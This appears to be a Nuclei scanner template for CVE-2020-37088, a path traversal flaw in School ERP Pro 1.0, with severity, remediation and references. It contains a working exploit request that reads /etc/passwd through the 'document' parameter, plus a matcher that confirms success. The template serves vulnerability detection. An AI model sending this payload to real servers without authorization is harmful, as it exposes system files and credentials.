id: CVE-2020-37088

info:
  name: School ERP Pro 1.0 - Arbitrary File Disclosure via Path Traversal
  author: bswearingen
  severity: high
  description: |
    School ERP Pro 1.0 contains a file disclosure vulnerability that allows unauthenticated attackers to read arbitrary files by manipulating the 'document' parameter in download.php. Attackers can access sensitive configuration files by supplying directory traversal paths to retrieve system credentials and configuration information.
  impact: |
    Unauthenticated attackers can read arbitrary files from the server including configuration files containing credentials.
  remediation: |
    Apply proper input validation to prevent path traversal in the document parameter.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2020-37088
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2020-37088
    cwe-id: CWE-22
  metadata:
    verified: true
    vendor: school-erp-pro
    product: school-erp-pro
  tags: cve,cve2020,school-erp,lfi,path-traversal,unauth

http:
  - raw:
      - |
        GET /download.php?document=../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - 'root:.*:0:0:'

      - type: status
        status:
          - 200
